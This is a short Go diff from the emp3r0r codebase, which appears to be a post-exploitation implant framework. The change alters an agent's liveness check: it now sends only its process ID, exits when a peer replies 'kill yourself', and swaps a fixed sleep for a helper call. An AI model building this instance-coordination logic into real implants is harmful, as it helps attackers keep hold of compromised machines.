@@ -12,7 +12,6 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
-	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -42,16 +41,19 @@ func IsAgentAlive(c net.Conn) bool {
 
 	// send hello to agent
 	for {
-		_, err := c.Write([]byte(fmt.Sprintf("hello from %d", os.Getpid())))
+		_, err := c.Write([]byte(fmt.Sprintf("%d", os.Getpid())))
 		if err != nil {
 			log.Print("write error:", err)
 			break
+		}
+		if strings.Contains(<-replyFromAgent, "kill yourself") {
+			os.Exit(0)
 		}
 		if strings.Contains(<-replyFromAgent, "emp3r0r") {
 			log.Println("Yes it's alive")
 			return true
 		}
-		time.Sleep(1e9)
+		util.TakeASnap()
 	}
 
 	return false
